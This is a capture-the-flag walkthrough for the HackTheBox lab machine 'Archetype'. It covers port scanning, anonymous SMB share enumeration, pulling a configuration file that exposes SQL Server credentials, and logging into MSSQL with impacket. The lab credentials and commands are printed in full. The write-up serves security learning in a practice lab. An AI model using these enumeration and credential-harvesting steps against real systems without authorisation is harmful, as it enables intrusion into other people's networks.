---
description: Walk through of the archetype machine
---

# Archetype (HTB Starting Point 3x1)

### Target Details

IP address: 10.129.95.187

## Full Walkthrough

### Port scan

We use naabu and nmap-cli to spped up the usual port scan.

```bash
naabu -host 10.129.95.187 -p - -nmap-cli 'nmap -sV -sC nmap-output'
```

Port scan results:

{% code fullWidth="false" %}
```awk
[INF] Current naabu version 2.1.6 (latest)
[INF] Running CONNECT scan with non root privileges
[INF] Found 12 ports on host 10.129.95.187 (10.129.95.187)
10.129.95.187:445
10.129.95.187:49664
10.129.95.187:139
10.129.95.187:47001
10.129.95.187:49668
10.129.95.187:49665
10.129.95.187:49666
10.129.95.187:49667
10.129.95.187:1433
10.129.95.187:49669
10.129.95.187:5985
10.129.95.187:135
[INF] Running nmap command: nmap -sV -sC nmap-output -p 445,139,49665,49666,1433,49669,5985,49667,49664,47001,49668,135 10.129.95.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 16:24 IST
Verbosity Increased to 1.
Verbosity Increased to 2.
Service scan Timing: About 58.33% done; ETC: 16:25 (0:00:43 remaining)
Completed Service scan at 16:25, 59.63s elapsed (12 services on 1 host)
NSE: Script scanning 10.129.95.187.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 17.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 3.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Nmap scan report for 10.129.95.187
Host is up (0.37s latency).
Scanned at 2023-05-17 16:24:15 IST for 82s

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.95.187:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-05-17T05:25:55+00:00; -5h29m42s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.95.187:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-17T05:18:40
| Not valid after:  2053-05-17T05:18:40
| MD5:   24ffbff89c78dbb723fe8280eb488645
| SHA-1: 946929bce2803adf2c0ba4fed1c47f546f1ca95b
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFkVxaO4nCKFNYZUoqFp1uDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMwNTE3MDUxODQwWhgPMjA1MzA1MTcwNTE4NDBaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALYsm+PL
| ppJGGDP+4yVoQl4D+QmxXK9oHS+VNaSinXnxggasmA74dViF280EepEHHaRkEv3m
| DvBYLGSqILjMmgWx+XVwsYTJaCapFzxx+78UUtrCpm+x1BquGy2x0sGWB265hSl+
| 63iBevho3VjftLDqd+WgRxAMJuvVuH9J0eGBNZXBNU2prStpz+586e6l7A2J9Ku4
| FpLEaOVEWpk6/DHVLfNwsfntVThgOcKTGVvaPJxsGkVXQqMWL8L1/JMyK7luVgHe
| /e2NkAg3HlTVQ9ifSBFB4HT/QJYDhesq91GsBWtli361uHMG3LMAoGiPjNg1qZPu
| gi7wpu2fkY0X0QkCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAXLCA9eJ1o0uUcvR7
| t0Xp31KFzVitgN7QW4nHbOBYTbJIQlv9/JjplGvHYJzNWy3lLFcEEoJs0WVHwRyE
| LJoaVhPkQIPCzfhppAN8BhKjrTbzauWjV8WV6R+Nky7cEKCxI7Fa4hUxrCaBXYbW
| 1o3PrYd3OZo4bLelLMz+nWIKzSdUlwj3stw0bkvzxbZRsFy3PTzxBtqdtt6ajQIF
| 0ZdM86mMWD9CFf60FUdPsO1kCoPvTOuhOuCeh7JyXAtp20nrmpNAVIqIPid0FYDm
| jT70T3rU5aAmiubsC+y9EV3SKToB6vGdSb0kgrqrJK9V+EJW9R0mL13fXPHh20KR
| 7UUrmw==
|_-----END CERTIFICATE-----
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4h05m41s, deviation: 3h07m52s, median: -5h29m42s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-16T22:25:39-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56233/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 11076/udp): CLEAN (Failed to receive data)
|   Check 4 (port 4389/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-17T05:25:35
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:25
Completed NSE at 16:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.41 seconds
```
{% endcode %}

### List available SMB shares

We have SMB running so let's try and connect with the SMB server and list available shares.

```awk
smbclient -N -L \\\\10.129.95.187\\
```

We use the `-N` flag as it supresses the default password prompt from smbclient - useful for situations where we do not need a password to access a share. We use the `-L` flag as it lists all available shares.

We get the follwing shares available:

```awk
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

We find that the backups share is publicly available and it's not an administrative share.&#x20;

### Enumerate and dump contents from backups share

```awk
smbclient -N  \\\\10.129.95.187\\backups
```

We find a file named `prod.dtsConfig`.&#x20;

```
smb: \> dir
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                5056511 blocks of size 4096. 2616175 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

A DTSCONFIG file (or a `.dtsConfig` file )is an XML configuration file used to apply property values to SQL Server Integration Services (SSIS) packages. The file contains one or more package configurations that consist of [metadata](https://techterms.com/definition/metadata) such as the server name, database names, and other connection properties to configure SSIS packages.

**DTSCONFIG files often contain sensitive information, therefore, access to the location of the files should be restricted.**

The contents of the file reveals a username and password for the MS-SQL database which we found in the port scan results.

{% code overflow="wrap" %}
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
{% endcode %}

From this we get the USER ID as `ARCHETYPE\sql_svc` and the password as `M3g4c0rp123`.

### Gain access to MS-SQL service using the credential from production data service configuration file.

#### Using impacket-mssqlclient&#x20;

```awk
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
```

This helps us to connect to the database after providing the password at the password prompt.



